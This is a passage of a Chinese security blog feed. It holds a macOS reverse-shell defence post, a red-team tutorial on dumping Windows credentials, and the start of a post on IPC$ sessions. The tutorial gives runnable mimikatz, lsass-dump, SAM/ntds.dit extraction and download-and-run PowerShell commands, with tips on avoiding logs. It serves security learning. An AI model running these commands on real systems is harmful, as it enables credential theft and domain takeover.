用户防御策略</h1><p>裸奔的 Mac 真的是一反弹一个准，太没安全感了，于是在师傅们的推荐下，入手了 little snitch，little snitch 官网链接：<a href="https://www.obdev.at/products/littlesnitch">https://www.obdev.at/products/littlesnitch</a></p><blockquote><p>声明下这个不是广告啊，只是分享下自己在 Mac 中的防御方法而已</p></blockquote><p>little snitch 可以用来监控 Mac 中所有的联网行为，界面长这个样子，个人觉着还是挺漂亮的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813151240.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>实测下来，还是不错的，即使在 Silent 模式下，当监测到有异常连接行为时也会告警，在使用过程中也是能成功拦截到反弹 Shell 请求的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813150936.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>不过 little snitch 是付费的，个人觉着买个家庭装是比较划算的，家庭装支持 5 台设备，几个小伙伴拼个单，每个人约合 94 元，另外这个比较良心的是它这个有效期是永久的。</p><p>一向习惯了白嫖的我，想了想为了安全考虑还是剁手了，毕竟我可不想那天被反制了，要是被反制了那就 GG 了。</p><p>说到这里也许会有人好奇，为啥不说说 Windows 用户的防御策略，于是我自己实际测试了一下，发现在 Windows 下装个杀软就行了，这里以火绒为例，当监测到反弹 Shell 动作时，火绒会直接弹出告警，所以感觉 Windows 就没啥好说的了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210813143544.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>好了，这篇文章就到这里了，在此没有过多赘述产生原因细节等，因为主要是想分享下自己的防御策略，具体的漏洞细节参考下面的参考文章即可。</p><blockquote><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg">https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 防御 </tag>
            
            <tag> 反制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】密码抓取</title>
      <link href="//210813-120018.html"/>
      <url>//210813-120018.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.dit 二进制文件中，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。</p><p>在非域环境中，即工作组的环境中，用户的密码等信息被存储在 SAM 文件中，该文件也同样是被系统禁止读取的。</p><p>Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：</p><pre class="line-numbers language-none"><code class="language-none">username:RID:LM-Hash:NT-Hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash（LAN Manager Hash）是 Windows 最早使用的加密算法，由 IBM 设计，其本质是 DES 加密，由于使用的 DES 算法，因此它的 KEY 是固定的，同时结合一些其他特性导致 LM Hash 加密算法较为脆弱，因此微软在 1993 年在 NT 3.1 中引入了 NTLM 协议。</p><p>NTLM Hash 是基于 MD4 的加密算法，个人版从 Vista 以后，服务版从 Windows Server 2003 以后，系统的认证方式都采用了 NTLM Hash，为了兼容性，微软也只是把 LM Hash 禁用了，只启用了 NTLM Hash.</p><p>在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804160118.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果用户密码为空密码或者不存储 LM Hash 的话，我们抓到的 LM Hash 就是 AAD3B435B51404EEAAD3B435B51404EE，所以在 Vista 和 Windows Server 2003 之后的系统里抓取到的 LM Hash 都是 AAD3B435B51404EEAAD3B435B51404EE，其实这里的 LM Hash 也没有任何意义了。</p><p>也就是说从Windows Vista 和 Windows Server 2008 开始，默认情况下只存储 NTLM Hash，LM Hash 将不再被使用。</p><p>下面看下常见的抓取密码的工具。</p><h2 id="1、GetPass"><a href="#1、GetPass" class="headerlink" title="1、GetPass"></a>1、GetPass</h2><p>GetPass 下载地址：<a href="https://bbs.pediy.com/thread-163383.htm">https://bbs.pediy.com/thread-163383.htm</a></p><p>以管理员权限直接运行 GetPassword.exe 直接查看到明文密码</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804170743.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、PwDump7"><a href="#2、PwDump7" class="headerlink" title="2、PwDump7"></a>2、PwDump7</h2><p>PwDump7 下载地址：<a href="https://www.tarasco.org/security/pwdump_7/">https://www.tarasco.org/security/pwdump_7/</a></p><p>PwDump7 只能获取到用户的 hash，不能看到明文密码，不过可以使用这个 hash 值去 cmd5 等平台查找明文或者直接用哈希传递。</p><p>PwDump7 同样使用管理员权限直接运行即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804171846.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、QuarkPwDump"><a href="#3、QuarkPwDump" class="headerlink" title="3、QuarkPwDump"></a>3、QuarkPwDump</h2><p>QuarkPwDump 下载地址：<a href="https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe">https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe</a></p><p>运行以下命令导出用户 Hash</p><pre class="line-numbers language-none"><code class="language-none">QuarkPwDump.exe --dump-hash-local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804172758.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、Get-PassHashes"><a href="#4、Get-PassHashes" class="headerlink" title="4、Get-PassHashes"></a>4、Get-PassHashes</h2><p>Get-PassHashes 是一个 PS 脚本，Get-PassHashes 下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p><p>导入 ps1 脚本，以管理员权限执行 Get-PassHashes 即可。</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-PassHashes.ps1Get-PassHashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者绕过无法执行 PS 脚本的限制，直接无文件执行（推荐），同样需要管理员权限。</p><pre class="line-numbers language-none"><code class="language-none"># 不使用代理powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;# 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804174013.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="5、mimikatz"><a href="#5、mimikatz" class="headerlink" title="5、mimikatz"></a>5、mimikatz</h2><p>说到密码抓取，又怎能少得了 mimikatz 呢。</p><p>mimikatz 是法国技术大神 Benjamin Delpy 使用 C 语言写的一款轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN 和 K8S 票据，还可以执行哈希传递、票据传递、构建黄金票据等。</p><p>mimikatz 项目 releases 地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p>使用 mimikatz 读取本地 SAM 文件，获取 NTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804175741.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 mimikatz 直接查看明文密码</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210804175941.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>另外也可以采用 PowerShell 远程加载 mimikatz，相较于直接拷贝 mimikatz.exe 到目标主机，这种方式隐藏性要更好些。</p><pre class="line-numbers language-none"><code class="language-none"># 不使用代理powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;# 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811125132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="6、SAM、SYSTEM、SECURITY-文件"><a href="#6、SAM、SYSTEM、SECURITY-文件" class="headerlink" title="6、SAM、SYSTEM、SECURITY 文件"></a>6、SAM、SYSTEM、SECURITY 文件</h2><h3 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h3><p>直接注册表导出 SAM、SYSTEM、SECURITY 文件</p><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SAM sam.hivreg save HKLM\SYSTEM system.hivreg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者使用 ninjacopy 脚本，下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;c:\sam.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SECURITY&quot; -LocalDestination &quot;c:\security.hiv&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果条件允许也可以使用 U 盘启动盘直接拷贝以下文件</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\config\SAMC:\Windows\System32\config\SYSTEMC:\Windows\System32\config\SECURITY<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除此之外，使用一些漏洞也可以获取到 SAM、SYSTEM、SECURITY 文件，比如 CVE-2021-36934，具体可参考 <a href="https://teamssix.com/210725-074847.html">https://teamssix.com/210725-074847.html</a></p><h3 id="获取-HASH"><a href="#获取-HASH" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>用 mimikatz 获取</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exelsadump::sam &#x2F;sam:sam.hiv &#x2F;system:system.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181245.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>用 cain 获取，找到 Cracker 里的 LM &amp; NTLM Hash，点击加号，选择从 SAM 导入，选择 SAM 文件后，查看 SYSTEM 文件的 HEX，复制到 Boot Key 里，点击下一步即可查看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811162549.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>cain 还可以直接查看明文密码，在 Decoders 里找到 LSA Secrets，导入 system.hiv 和 security.hiv 就可以看到明文的密码了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811163002.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>用 SAMInside 读取，直接在 File 菜单中选择导入 SAM 和 SYSTEM 文件即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811161122.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="7、lsass-dmp-文件"><a href="#7、lsass-dmp-文件" class="headerlink" title="7、lsass.dmp 文件"></a>7、lsass.dmp 文件</h2><h3 id="导出文件-1"><a href="#导出文件-1" class="headerlink" title="导出文件"></a>导出文件</h3><p>任务管理器导出 lsass.dmp 文件，在任务管理器中找到 lsass.exe 右击选择创建转储文件即可。</p><p>或者使用 Procdump 导出 lsass.dmp 文件，Procdump 是微软官方发布的工具，因此基本不会被杀软拦截，下载地址：<a href="https://download.sysinternals.com/files/Procdump.zip">https://download.sysinternals.com/files/Procdump.zip</a></p><pre class="line-numbers language-none"><code class="language-none">procdump -accepteula -ma lsass.exe lsass.DMP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="获取-HASH-1"><a href="#获取-HASH-1" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>使用 mimikatz 可获取 lsass.dmp 文件里的 hash 以及明文密码值</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exesekurlsa::minidump lsass.DMPsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811172353.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="8、ntds-dit-文件"><a href="#8、ntds-dit-文件" class="headerlink" title="8、ntds.dit 文件"></a>8、ntds.dit 文件</h2><p>在域中的所有账号密码被存放在了 ntds.dit 文件中，如果获取到该文件就相当于拿到整个域权限，不过该文件只在域控中。</p><p>ntds.dit 文件位置:</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\NTDS\NTDS.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出-ntds-dit"><a href="#导出-ntds-dit" class="headerlink" title="导出 ntds.dit"></a>导出 ntds.dit</h3><p>Ntdsutil 导出 ntds.dit 和 system 文件，并放在 C 盘目录下</p><pre class="line-numbers language-none"><code class="language-none">Ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812181529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>vssadmin 导出 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">vssadmin create shadow &#x2F;for&#x3D;C:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit# SAM 等文件也可以使用 vssadmin 导出copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hivcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NinjaCopy 脚本也可以，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p><pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="获取-HASH-2"><a href="#获取-HASH-2" class="headerlink" title="获取 HASH"></a>获取 HASH</h3><p>NTDSDumpEx 查看 ntds.dit，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system.hiv -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811174802.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 impacket 里的 secretsdump.py 脚本查看 ntds.dit 内容，下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210811175616.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了拷贝 ntds.dit 到本地外，mimikatz 也可以直接查看本机的域用户所有的账号密码，不过相对于拷贝 ntds.dit 到自己的机器上来说，直接使用 mimikatz 隐蔽性肯定就会差些了。</p><p>直接获取 teamssix 域内所有用户 </p><pre class="line-numbers language-none"><code class="language-none">hashlsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取单个用户的详细信息</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="9、WIFI-密码"><a href="#9、WIFI-密码" class="headerlink" title="9、WIFI 密码"></a>9、WIFI 密码</h2><p>使用自带命令可直接查询</p><p>获取登录过的 WIFI 名称</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取某个连接过的 WIFI 密码</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profile name&#x3D;&quot;teamssix&quot; key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取所有连接过的 WIFI 密码</p><pre class="line-numbers language-none"><code class="language-none">for &#x2F;f  &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210812091842.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://forum.butian.net/share/259">https://forum.butian.net/share/259</a></p><p><a href="https://zhuanlan.zhihu.com/p/220277028">https://zhuanlan.zhihu.com/p/220277028</a></p><p><a href="https://y4er.com/post/ntlm-hash-and-lm-hash/">https://y4er.com/post/ntlm-hash-and-lm-hash/</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/108141331">https://blog.csdn.net/qq_41874930/article/details/108141331</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/108149449">https://blog.csdn.net/qq_41874930/article/details/108149449</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】19、IPC 与计划任务</title>
      <link href="//210802-181052.html"/>
      <url>//210802-181052.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p><h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p><p>建立 IPC 连接：</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 net use 可以查看当前建立的连接</p><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator命令成功完成。C:\&gt;net use会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------OK                     \\192.168.7.107\ipc$      Microsoft Windows Network命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>映射磁盘到本地</p><pre class="line-numbers language-none"><code class="language-none">net use t: \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除映射的磁盘</p><pre class="line-numbers language-none"><code class="language-none">net use t: &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dir 列出对方目录</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;dir \\192.168.7.107\c$ 驱动器 \\192.168.7.107\c$ 中的卷没有标签。 卷的序列号是 BC2F-8F01 \\192.168.7.107\c$ 的目录2020&#x2F;11&#x2F;24  17:28    &lt;DIR&gt;          Program Files2020&#x2F;11&#x2F;24  17:26    &lt;DIR&gt;          Program Files (x86)2021&#x2F;02&#x2F;13  17:49    &lt;DIR&gt;          TEMP2021&#x2F;08&#x2F;02  11:42    &lt;DIR&gt;          Users2020&#x2F;11&#x2F;25  08:37    &lt;DIR&gt;          Windows               0 个文件              0 字节              5 个目录 32,833,009,664 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tasklist 查看进程</p><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX映像名称                       PID 会话名              会话#       内存使用&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0                            0         24 KSystem                           4                            0        368 Ksmss.exe                       260                            0        628 Kcsrss.exe                      356                            0      2,360 Kwininit.exe                    408                            0        264 Kcsrss.exe                      420                            1      8,692 Kwinlogon.exe                   468                            1      2,012 Kservices.exe                   512                            0      7,460 Klsass.exe                      520                            0     10,216 Klsm.exe                        528                            0      4,148 Kspoolsv.exe                   1356                            0      6,504 Ksvchost.exe                   1392                            0      7,028 K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 \del 可断开连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p><p>这里看看在建立 IPC 